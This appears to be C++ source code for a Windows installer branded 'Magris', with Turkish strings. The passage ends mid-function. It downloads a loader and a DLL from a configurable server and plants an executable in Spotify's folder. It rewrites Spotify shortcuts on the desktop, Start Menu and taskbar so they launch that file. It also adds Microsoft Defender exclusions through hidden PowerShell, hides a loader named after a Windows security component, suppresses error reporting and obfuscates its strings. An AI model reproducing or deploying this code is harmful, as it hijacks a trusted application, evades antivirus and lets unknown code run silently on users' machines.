
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <winioctl.h>
#include <werapi.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlguid.h>
#include <Shobjidl.h>
#include <objidl.h>
#include <iostream>
#include <string>
#include <vector>

#include "PrefetchShimName.h"
#include "LauncherDllName.h"
#include "SetupResources.h"
#include "SpotifyPePatch.h"
#include "XorStr.h"
#include <thread>
#include <chrono>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "wer.lib")
#pragma comment(lib, "wininet.lib")

static const std::string AUTH_URL_A_S = XS("kendi auth  ip nizi girin");
static const char* AUTH_URL_A = AUTH_URL_A_S.c_str();
static const int   AUTH_PORT_A = 3131;

static const std::string AUTH_PREFETCH_SHIM_GET_A_S = XS("/api/download/prefetch-shim/latest");
static const char* AUTH_PREFETCH_SHIM_GET_A = AUTH_PREFETCH_SHIM_GET_A_S.c_str();
static const DWORD kHttpNoDiskCache = INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE;

static LONG WINAPI SilentUnhandledFilter(EXCEPTION_POINTERS*) {
    ExitProcess(1);
    return EXCEPTION_EXECUTE_HANDLER;
}
static void MinimizeEventViewerTraces() {
    SetUnhandledExceptionFilter(SilentUnhandledFilter);
    wchar_t exePath[MAX_PATH] = {};
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH))
        WerAddExcludedApplication(exePath, FALSE);
}



#define FOREGROUND_WHITE (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
#define FOREGROUND_CYAN (FOREGROUND_GREEN | FOREGROUND_BLUE)
#define FOREGROUND_YELLOW (FOREGROUND_RED | FOREGROUND_GREEN)
#define FOREGROUND_PURPLE (FOREGROUND_RED | FOREGROUND_BLUE)

void SetConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void PrintBanner() {
    SetConsoleColor(FOREGROUND_PURPLE | FOREGROUND_INTENSITY);
    std::cout << R"(
 __  __                  _       ____       _               
|  \/  | __ _  __ _ _ __(_)___  / ___|  ___| |_ _   _ _ __  
| |\/| |/ _` |/ _` | '__| / __| \___ \ / _ \ __| | | | '_ \ 
| |  | | (_| | (_| | |  | \__ \  ___) |  __/ |_| |_| | |_) |
|_|  |_|\__,_|\__, |_|  |_|___/ |____/ \___|\__|\__,_| .__/ 
              |___/                                  |_|    
)" << std::endl;
    SetConsoleColor(FOREGROUND_WHITE);
}

static const char* GetProgressMessage(int percent) {
    static const std::string steps[] = {
        XS("Dosyalar hazirlaniyor..."),
        XS("Sistem kontrol ediliyor..."),
        XS("?.dll analiz ediliyor..."),
        XS("Gerekli moduller indiriliyor..."),
        XS("Guvenlik ayarlari yapiliyor..."),
        XS("Kurulum gerceklestiriliyor..."),
        XS("Hedef sistem guncelleniyor..."),
        XS("Son rotuslar..."),
        XS("Kayitlar temizleniyor..."),
        XS("Kurulum tamamlaniyor...")
    };
    int idx = percent / 10;
    if (idx < 0) idx = 0;
    if (idx > 9) idx = 9;
    return steps[idx].c_str();
}

void PrintProgress(const char* message, int percent) {
    if (percent < 0) percent = 0;
    if (percent > 100) percent = 100;
    SetConsoleColor(FOREGROUND_CYAN);
    std::cout << XS("\r[");
    const int progressWidth = 40;
    const int pos = (percent * progressWidth) / 100;
    for (int i = 0; i < progressWidth; ++i) {
        if (i < pos) std::cout << XS("=");
        else if (i == pos) std::cout << XS(">");
        else std::cout << XS(" ");
    }
    std::cout << XS("] ") << percent << XS("% - ") << message << XS("                    ");
    std::cout.flush();
    SetConsoleColor(FOREGROUND_WHITE);
}

void PrintProgress(int percent) {
    PrintProgress(GetProgressMessage(percent), percent);
}

void PrintStatus(const char* message, bool success) {
    if (success) {
        SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << XS("[OK] ");
    } else {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << XS("[FAIL] ");
    }
    SetConsoleColor(FOREGROUND_WHITE);
    std::cout << message << std::endl;
}

void PrintError(const char* message) {
    std::cout << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cout << XS("  [!] HATA: ") << message << std::endl;
    SetConsoleColor(FOREGROUND_WHITE);
}

static std::wstring GetExeDir() {
    wchar_t buf[MAX_PATH] = {};
    GetModuleFileNameW(NULL, buf, MAX_PATH);
    std::wstring path(buf);
    size_t last = path.find_last_of(XW(L"\\/"));
    if (last != std::wstring::npos) path.resize(last + 1);
    return path;
}


static void CopyPrefetchShimIfPresent(const std::wstring& srcDir, const std::wstring& destDir) {
    std::wstring src = srcDir + MAGRIS_PREFETCH_SHIM_DLL_W;
    std::wstring dst = destDir + MAGRIS_PREFETCH_SHIM_DLL_W;
    if (GetFileAttributesW(src.c_str()) != INVALID_FILE_ATTRIBUTES)
        CopyFileW(src.c_str(), dst.c_str(), FALSE);
}


static std::wstring ResolveShortcutTarget(const std::wstring& lnkPath) {
    std::wstring out;
    IShellLinkW* psl = NULL;
    if (FAILED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl)))
        return L"";
    IPersistFile* ppf = NULL;
    if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) { psl->Release(); return L""; }
    if (FAILED(ppf->Load(lnkPath.c_str(), STGM_READ))) { ppf->Release(); psl->Release(); return L""; }
    wchar_t target[MAX_PATH] = {};
    if (SUCCEEDED(psl->GetPath(target, MAX_PATH, NULL, 0)))
        out = target;
    ppf->Release();
    psl->Release();
    return out;
}

static bool IsRealSpotifyExe(const std::wstring& path) {
    if (path.empty()) return false;
    if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) return false;
    if (path.find(XW(L"Spotify")) != std::wstring::npos || path.find(XW(L"spotify")) != std::wstring::npos)
        return true;
    return false;
}

static std::wstring FindSpotifyPath() {
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    
    wchar_t appData[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
        std::wstring candidate = std::wstring(appData) + XW(L"\\Spotify\\Spotify.exe");
        if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES)
            return candidate;
    }

    
    wchar_t localAppData[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::wstring candidate = std::wstring(localAppData) + XW(L"\\Microsoft\\WindowsApps\\Spotify.exe");
        if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES)
            return candidate;
    }

    
    wchar_t desktop[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop))) {
        std::wstring desk = std::wstring(desktop) + XW(L"\\");
        WIN32_FIND_DATAW fd = {};
        HANDLE h = FindFirstFileW((desk + XW(L"*.lnk")).c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
                    std::wstring name = fd.cFileName;
                    if (name.find(XW(L"Spotify")) != std::wstring::npos || name.find(XW(L"spotify")) != std::wstring::npos) {
                        std::wstring target = ResolveShortcutTarget(desk + name);
                        if (IsRealSpotifyExe(target)) {
                            FindClose(h);
                            return target;
                        }
                    }
                }
            } while (FindNextFileW(h, &fd));
            FindClose(h);
        }
    }

    
    const wchar_t* paths[] = {
        XWC(L"C:\\Program Files\\Spotify\\Spotify.exe"),
        XWC(L"C:\\Program Files (x86)\\Spotify\\Spotify.exe"),
    };
    for (const wchar_t* p : paths) {
        if (GetFileAttributesW(p) != INVALID_FILE_ATTRIBUTES)
            return std::wstring(p);
    }
    return L"";
}

static bool DownloadFromAuth(const char* endpoint, std::vector<BYTE>& outBuf) {
    HINTERNET hInet = InternetOpenA(XSC("MagrisSetup/1.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return false;
    HINTERNET hConn = InternetConnectA(hInet, AUTH_URL_A, (INTERNET_PORT)AUTH_PORT_A, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return false; }
    HINTERNET hReq = HttpOpenRequestA(hConn, XSC("GET"), endpoint, NULL, NULL, NULL, kHttpNoDiskCache, 0);
    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
    if (!HttpSendRequestA(hReq, NULL, 0, NULL, 0)) { InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
    DWORD statusCode = 0, sz = sizeof(statusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &sz, NULL);
    if (statusCode != 200) { InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
    outBuf.clear();
    BYTE tmp[8192];
    DWORD bytesRead = 0;
    while (InternetReadFile(hReq, tmp, sizeof(tmp), &bytesRead) && bytesRead > 0)
        outBuf.insert(outBuf.end(), tmp, tmp + bytesRead);
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return !outBuf.empty();
}

static bool DownloadHostExeToFile(const std::wstring& destPath) {
    std::vector<BYTE> buf;
    if (!DownloadFromAuth(XSC("/api/download/loader/latest"), buf)) return false;
    HANDLE f = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD w;
    WriteFile(f, buf.data(), (DWORD)buf.size(), &w, NULL);
    CloseHandle(f);
    return (w == (DWORD)buf.size());
}

static bool DownloadPrefetchShimToFile(const std::wstring& destPath) {
    std::vector<BYTE> buf;
    if (!DownloadFromAuth(AUTH_PREFETCH_SHIM_GET_A, buf)) return false;
    HANDLE f = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD w;
    WriteFile(f, buf.data(), (DWORD)buf.size(), &w, NULL);
    CloseHandle(f);
    return (w == (DWORD)buf.size());
}


static bool InstallPrefetchShim(const std::wstring& fallbackSrcDir, const std::wstring& destDir) {
    std::wstring dest = destDir + MAGRIS_PREFETCH_SHIM_DLL_W;
    for (int retry = 0; retry < 3; retry++) {
        if (DownloadPrefetchShimToFile(dest))
            return true;
        std::this_thread::sleep_for(std::chrono::milliseconds(400));
    }
    CopyPrefetchShimIfPresent(fallbackSrcDir, destDir);
    return GetFileAttributesW(dest.c_str()) != INVALID_FILE_ATTRIBUTES;
}


static void HijackSpotifyShortcutEx(const std::wstring& ourLauncherPath, const std::wstring& workingDir, const std::wstring& iconPath, const std::wstring* realPaths, size_t count);


static bool PathMatches(const std::wstring& shortcutTarget, const std::wstring& expectedPath) {
    if (shortcutTarget.empty() || expectedPath.empty()) return false;
    wchar_t bufT[MAX_PATH] = {}, bufE[MAX_PATH] = {};
    if (GetFullPathNameW(shortcutTarget.c_str(), MAX_PATH, bufT, NULL) == 0) return _wcsicmp(shortcutTarget.c_str(), expectedPath.c_str()) == 0;
    if (GetFullPathNameW(expectedPath.c_str(), MAX_PATH, bufE, NULL) == 0) return _wcsicmp(shortcutTarget.c_str(), expectedPath.c_str()) == 0;
    return _wcsicmp(bufT, bufE) == 0;
}


static void HijackShortcutsInFolder(const std::wstring& folderDir, const std::wstring& ourLauncherPath, const std::wstring& workingDir, const std::wstring& iconPath, const std::wstring* realPaths, size_t realPathCount) {
    std::wstring searchPath = folderDir + XW(L"*.lnk");
    WIN32_FIND_DATAW fd = {};
    HANDLE h = FindFirstFileW(searchPath.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::wstring lnkPath = folderDir + fd.cFileName;
        IShellLinkW* psl = NULL;
        if (FAILED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) continue;
        IPersistFile* ppfLoad = NULL;
        if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppfLoad)) || FAILED(ppfLoad->Load(lnkPath.c_str(), STGM_READ))) { if (ppfLoad) ppfLoad->Release(); psl->Release(); continue; }
        ppfLoad->Release();
        wchar_t target[MAX_PATH] = {};
        psl->Resolve(NULL, SLR_ANY_MATCH | SLR_NO_UI);
        if (FAILED(psl->GetPath(target, MAX_PATH, NULL, 0))) { psl->Release(); continue; }
        std::wstring tStr(target);
        bool match = (tStr.find(XW(L"Spotify")) != std::wstring::npos ||
                      tStr.find(XW(L"spotify")) != std::wstring::npos ||
                      tStr.find(MAGRIS_HOST_EXE_W) != std::wstring::npos);
        if (!match) {
            for (size_t i = 0; i < realPathCount; i++) {
                if (PathMatches(target, realPaths[i])) { match = true; break; }
            }
        }
        if (!match) { psl->Release(); continue; }
        psl->SetPath(ourLauncherPath.c_str());
        psl->SetArguments(L"");
        psl->SetWorkingDirectory(workingDir.c_str());
        psl->SetIconLocation(iconPath.c_str(), 0);
        psl->SetDescription(XWC(L"Spotify"));
        IShellLinkDataList* pdl = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IShellLinkDataList, (void**)&pdl))) {
            DWORD dwFlags = 0;
            if (SUCCEEDED(pdl->GetFlags(&dwFlags))) {
                const DWORD SLDF_RUNAS_USER_FLAG = 0x00002000u;
                pdl->SetFlags(dwFlags & ~SLDF_RUNAS_USER_FLAG);
            }
            pdl->Release();
        }
        IPersistFile* ppf = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
            ppf->Save(lnkPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}


static void HijackSpotifyShortcut(const std::wstring& ourLauncherPath, const std::wstring& workingDir, const std::wstring& iconPath, const std::wstring& realSpotifyExe) {
    std::wstring realPaths[] = { realSpotifyExe };
    HijackSpotifyShortcutEx(ourLauncherPath, workingDir, iconPath, realPaths, 1);
}

static void RestoreShortcutsInFolder(const std::wstring& folderDir, const std::wstring& realSpotifyExe) {
    std::wstring searchPath = folderDir + XW(L"*.lnk");
    WIN32_FIND_DATAW fd = {};
    HANDLE h = FindFirstFileW(searchPath.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::wstring lnkPath = folderDir + fd.cFileName;
        IShellLinkW* psl = NULL;
        if (FAILED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) continue;
        IPersistFile* ppfLoad = NULL;
        if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppfLoad)) || FAILED(ppfLoad->Load(lnkPath.c_str(), STGM_READ))) {
            if (ppfLoad) ppfLoad->Release();
            psl->Release();
            continue;
        }
        ppfLoad->Release();
        wchar_t target[MAX_PATH] = {};
        psl->Resolve(NULL, SLR_ANY_MATCH | SLR_NO_UI);
        if (FAILED(psl->GetPath(target, MAX_PATH, NULL, 0))) { psl->Release(); continue; }
        std::wstring tStr(target);
        bool match = (tStr.find(XW(L"Spotify")) != std::wstring::npos ||
                      tStr.find(XW(L"spotify")) != std::wstring::npos ||
                      tStr.find(XW(L"SpotifyLaunchers")) != std::wstring::npos ||
                      tStr.find(MAGRIS_HOST_EXE_W) != std::wstring::npos ||
                      tStr.find(MAGRIS_HOST_EXE_W) != std::wstring::npos ||
                      tStr.find(MAGRIS_LEGACY_LOADER_DLL_W) != std::wstring::npos ||
                      tStr.find(XW(L"MagrisLauncher")) != std::wstring::npos ||
                      tStr.find(XW(L"WscNotification")) != std::wstring::npos);
        if (!match) { psl->Release(); continue; }
        if (PathMatches(target, realSpotifyExe)) { psl->Release(); continue; }

        psl->SetPath(realSpotifyExe.c_str());
        psl->SetArguments(L"");
        IShellLinkDataList* pdl = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IShellLinkDataList, (void**)&pdl))) {
            DWORD dwFlags = 0;
            if (SUCCEEDED(pdl->GetFlags(&dwFlags))) {
                const DWORD SLDF_RUNAS_USER_FLAG = 0x00002000u;
                pdl->SetFlags(dwFlags & ~SLDF_RUNAS_USER_FLAG);
            }
            pdl->Release();
        }
        IPersistFile* ppf = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
            ppf->Save(lnkPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

static void RestoreSpotifyShortcuts(const std::wstring& realSpotifyExe) {
    if (FAILED(CoInitialize(NULL))) return;
    wchar_t buf[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, buf))) {
        std::wstring p = std::wstring(buf) + XW(L"\\");
        RestoreShortcutsInFolder(p, realSpotifyExe);
    }
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAMS, NULL, 0, buf))) {
        std::wstring p = std::wstring(buf) + XW(L"\\");
        RestoreShortcutsInFolder(p, realSpotifyExe);
        std::wstring sub = p + XW(L"Spotify\\");
        if (GetFileAttributesW(sub.c_str()) != INVALID_FILE_ATTRIBUTES)
            RestoreShortcutsInFolder(sub, realSpotifyExe);
    }
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, buf))) {
        std::wstring p = std::wstring(buf) + XW(L"\\");
        RestoreShortcutsInFolder(p, realSpotifyExe);
        std::wstring sub = p + XW(L"Spotify\\");
        if (GetFileAttributesW(sub.c_str()) != INVALID_FILE_ATTRIBUTES)
            RestoreShortcutsInFolder(sub, realSpotifyExe);
    }
    CoUninitialize();
}

static bool LoadEmbeddedResource(int resId, std::vector<BYTE>& outBuf) {
    HMODULE hMod = GetModuleHandleW(NULL);
    HRSRC hRes = FindResourceW(hMod, MAKEINTRESOURCEW(resId), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(hMod, hRes);
    if (!hData) return false;
    DWORD size = SizeofResource(hMod, hRes);
    const BYTE* p = (const BYTE*)LockResource(hData);
    if (!p || size == 0) return false;
    outBuf.assign(p, p + size);
    return true;
}

static bool WriteBytesToFile(const std::wstring& destPath, const BYTE* data, DWORD size) {
    HANDLE f = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD w = 0;
    BOOL ok = WriteFile(f, data, size, &w, NULL);
    CloseHandle(f);
    return ok && w == size;
}

static ULONGLONG GetFileSize64(const std::wstring& path) {
    WIN32_FILE_ATTRIBUTE_DATA fad = {};
    if (!GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &fad))
        return 0;
    return ((ULONGLONG)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
}

static std::wstring ResolveOriginalSpotifyExePath(const std::wstring& spotifyDir, const std::wstring& detectedPath) {
    RestoreSpotifyInstallDir(spotifyDir);
    RemoveLegacySpotifyStub(spotifyDir);
    std::wstring canonical = spotifyDir + XW(L"Spotify.exe");
    if (GetFileAttributesW(canonical.c_str()) != INVALID_FILE_ATTRIBUTES)
        return canonical;
    std::wstring realBackup = spotifyDir + XW(L"Spotify_real.exe");
    if (GetFileAttributesW(realBackup.c_str()) != INVALID_FILE_ATTRIBUTES)
        return realBackup;
    return detectedPath;
}

static const ULONGLONG kMinHostExeBytes = 1024ULL * 1024ULL;

static bool CopyHostExeIfValid(const std::wstring& src, const std::wstring& dest) {
    if (GetFileAttributesW(src.c_str()) == INVALID_FILE_ATTRIBUTES)
        return false;
    if (GetFileSize64(src) < kMinHostExeBytes)
        return false;
    return CopyFileW(src.c_str(), dest.c_str(), FALSE) != FALSE;
}


static bool InstallSpotifyLaunchersExe(const std::wstring& spotifyDir, const std::wstring& packageDir) {
    const std::wstring hostName = XW(L"SpotifyLaunchers.exe");
    const std::wstring dest = spotifyDir + hostName;

    for (int retry = 0; retry < 3; retry++) {
        if (DownloadHostExeToFile(dest) && GetFileSize64(dest) >= kMinHostExeBytes)
            return true;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    const std::wstring localCandidates[] = {
        packageDir + hostName,
        packageDir + XW(L"bin\\") + hostName,
    };
    for (const std::wstring& src : localCandidates) {
        if (CopyHostExeIfValid(src, dest))
            return true;
    }

    std::vector<BYTE> embedded;
    if (LoadEmbeddedResource(IDR_MAGRIS_HOST_EXE, embedded) && embedded.size() >= kMinHostExeBytes) {
        if (WriteBytesToFile(dest, embedded.data(), (DWORD)embedded.size()))
            return true;
    }

    for (const std::wstring& src : localCandidates) {
        if (GetFileAttributesW(src.c_str()) != INVALID_FILE_ATTRIBUTES &&
            CopyFileW(src.c_str(), dest.c_str(), FALSE))
            return true;
    }
    if (LoadEmbeddedResource(IDR_MAGRIS_HOST_EXE, embedded) && !embedded.empty()) {
        if (WriteBytesToFile(dest, embedded.data(), (DWORD)embedded.size()))
            return true;
    }
    return false;
}

static bool WriteSpotifyLaunchersShortcut(const std::wstring& lnkPath, const std::wstring& hostPath,
    const std::wstring& workDir, const std::wstring& iconPath) {
    IShellLinkW* psl = NULL;
    if (FAILED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl)))
        return false;
    psl->SetPath(hostPath.c_str());
    psl->SetArguments(L"");
    psl->SetWorkingDirectory(workDir.c_str());
    psl->SetIconLocation(iconPath.c_str(), 0);
    psl->SetDescription(XWC(L"Spotify"));
    psl->SetShowCmd(SW_SHOWNORMAL);
    IPersistFile* ppf = NULL;
    if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
        psl->Release();
        return false;
    }
    HRESULT hr = ppf->Save(lnkPath.c_str(), TRUE);
    ppf->Release();
    psl->Release();
    return SUCCEEDED(hr);
}

static void EnsureSpotifyLaunchersShortcuts(const std::wstring& hostPath, const std::wstring& workDir, const std::wstring& iconPath) {
    wchar_t buf[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, buf)))
        WriteSpotifyLaunchersShortcut(std::wstring(buf) + XW(L"\\Spotify.lnk"), hostPath, workDir, iconPath);
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAMS, NULL, 0, buf))) {
        std::wstring programs = std::wstring(buf) + XW(L"\\");
        WriteSpotifyLaunchersShortcut(programs + XW(L"Spotify.lnk"), hostPath, workDir, iconPath);
        std::wstring sub = programs + XW(L"Spotify");
        CreateDirectoryW(sub.c_str(), NULL);
        WriteSpotifyLaunchersShortcut(sub + XW(L"\\Spotify.lnk"), hostPath, workDir, iconPath);
    }
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, buf))) {
        std::wstring programs = std::wstring(buf) + XW(L"\\");
        WriteSpotifyLaunchersShortcut(programs + XW(L"Spotify.lnk"), hostPath, workDir, iconPath);
        std::wstring sub = programs + XW(L"Spotify");
        CreateDirectoryW(sub.c_str(), NULL);
        WriteSpotifyLaunchersShortcut(sub + XW(L"\\Spotify.lnk"), hostPath, workDir, iconPath);
    }
}

static void CleanupLegacyLauncherFiles(const std::wstring& spotifyDir) {
    DeleteFileW((spotifyDir + MAGRIS_LEGACY_LOADER_DLL_W).c_str());
}

static void CleanupLegacyInstall() {
    std::wstring magrisDir = XW(L"C:\\ProgramData\\Microsoft\\WscNotification\\");
    DeleteFileW((magrisDir + XW(L"SpotifyLaunchers.exe")).c_str());
    DeleteFileW((magrisDir + XW(L"spotify_path.txt")).c_str());
    DeleteFileW((magrisDir + XW(L"launcher_path.txt")).c_str());
}
static void HijackSpotifyShortcutEx(const std::wstring& ourLauncherPath, const std::wstring& workingDir, const std::wstring& iconPath, const std::wstring* realPaths, size_t count) {
    if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) return;
    EnsureSpotifyLaunchersShortcuts(ourLauncherPath, workingDir, iconPath);
    wchar_t buf[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, buf))) { std::wstring p = std::wstring(buf) + XW(L"\\"); HijackShortcutsInFolder(p, ourLauncherPath, workingDir, iconPath, realPaths, count); }
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAMS, NULL, 0, buf))) {
        std::wstring p = std::wstring(buf) + XW(L"\\"); HijackShortcutsInFolder(p, ourLauncherPath, workingDir, iconPath, realPaths, count);
        std::wstring sub = p + XW(L"Spotify\\"); if (GetFileAttributesW(sub.c_str()) != INVALID_FILE_ATTRIBUTES) HijackShortcutsInFolder(sub, ourLauncherPath, workingDir, iconPath, realPaths, count);
    }
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, buf))) {
        std::wstring p = std::wstring(buf) + XW(L"\\"); HijackShortcutsInFolder(p, ourLauncherPath, workingDir, iconPath, realPaths, count);
        std::wstring sub = p + XW(L"Spotify\\"); if (GetFileAttributesW(sub.c_str()) != INVALID_FILE_ATTRIBUTES) HijackShortcutsInFolder(sub, ourLauncherPath, workingDir, iconPath, realPaths, count);
    }
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, buf))) {
        std::wstring taskbar = std::wstring(buf) + XW(L"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\");
        if (GetFileAttributesW(taskbar.c_str()) != INVALID_FILE_ATTRIBUTES)
            HijackShortcutsInFolder(taskbar, ourLauncherPath, workingDir, iconPath, realPaths, count);
    }
    CoUninitialize();
}

static void AddDefenderExclusion(const std::wstring& path) {
    std::wstring cmd = XW(L"powershell.exe -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '") + path + XW(L"'\" >nul 2>&1");
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}


static std::wstring GetDirFromExePath(const std::wstring& exePath) {
    if (exePath.empty()) return L"";
    size_t i = exePath.find_last_of(XW(L"\\/"));
    return (i != std::wstring::npos) ? exePath.substr(0, i + 1) : exePath;
}

static void DoSetup(const std::wstring& path) {
    std::wstring targetDir = XW(L"C:\\ProgramData\\SecurityHealth");
    std::wstring exeName = XW(L"WscNotification.exe");

    AddDefenderExclusion(XW(L"C:\\ProgramData\\SecurityHealth"));
    AddDefenderExclusion(XW(L"C:\\ProgramData\\Microsoft\\WscNotification"));

    WIN32_FIND_DATAW fd = {};
    HANDLE h = FindFirstFileW((path + XW(L"win_loader\\*.exe")).c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        std::wstring loaderExe = path + XW(L"win_loader\\") + fd.cFileName;
        FindClose(h);
        CreateDirectoryW(targetDir.c_str(), NULL);
        std::wstring dest = targetDir + XW(L"\\") + exeName;
        CopyFileW(loaderExe.c_str(), dest.c_str(), FALSE);

        
#if 0
        std::wstring startupDir = XW(L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        std::wstring vbsPath = startupDir + XW(L"\\WscNotification.vbs");
        HANDLE vf = CreateFileW(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (vf != INVALID_HANDLE_VALUE) {
            const std::string vbs = XS("Set WshShell = CreateObject(\"WScript.Shell\")\r\n")
                + XS("WshShell.Run \"C:\\ProgramData\\SecurityHealth\\WscNotification.exe\", 0, False\r\n")
                + XS("Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n")
                + XS("fso.GetFolder(\"C:\\ProgramData\\SecurityHealth\").Attributes = fso.GetFolder(\"C:\\ProgramData\\SecurityHealth\").Attributes Or 2\r\n");
            DWORD w;
            WriteFile(vf, vbs.c_str(), (DWORD)vbs.size(), &w, NULL);
            CloseHandle(vf);
        }
#endif
        SetFileAttributesW(targetDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    std::wstring dcPath = FindSpotifyPath();
    if (!dcPath.empty()) {
        std::wstring spotifyDir = GetDirFromExePath(dcPath);
        AddDefenderExclusion(spotifyDir);
        std::wstring hostDest = spotifyDir + MAGRIS_HOST_EXE_W;
        InstallSpotifyLaunchersExe(spotifyDir, path);
        CleanupLegacyLauncherFiles(spotifyDir);
        std::wstring realSpotify = ResolveOriginalSpotifyExePath(spotifyDir, dcPath);
        WriteSpotifyPathFile(spotifyDir, realSpotify);
        HijackSpotifyShortcutEx(hostDest, spotifyDir, dcPath, &dcPath, 1);

        std::wstring wsrc = path + XW(L"wezy.png"), wdst = spotifyDir + XW(L"wezy.png");
